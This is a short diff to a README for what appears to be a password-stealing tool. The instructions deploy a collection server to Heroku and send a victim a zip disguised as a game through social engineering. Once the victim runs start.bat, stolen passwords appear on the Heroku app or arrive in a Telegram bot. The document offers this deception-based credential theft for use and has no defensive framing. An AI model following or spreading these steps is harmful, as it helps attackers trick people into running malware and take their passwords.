@@ -12,8 +12,8 @@ cd parrot
 heroku login  
 git push -u heroku 
 ```
-send the payload.zip to victim using any social engineering techniques. and make sure the victim opens the start.bat file  
-now you can see the password at [yourapp].heroku.com  
+send the Game-monkey-lander.zip to victim using any social engineering techniques. and make sure the victim opens the start.bat file  
+now you can see the password at [yourapp].heroku.com or it's sent to your telegram account through the bot you setted up using @BotFather
 # payload
 this include a mini game that launches when start.bat is opened.  
 you must change the start.bat in the payload    
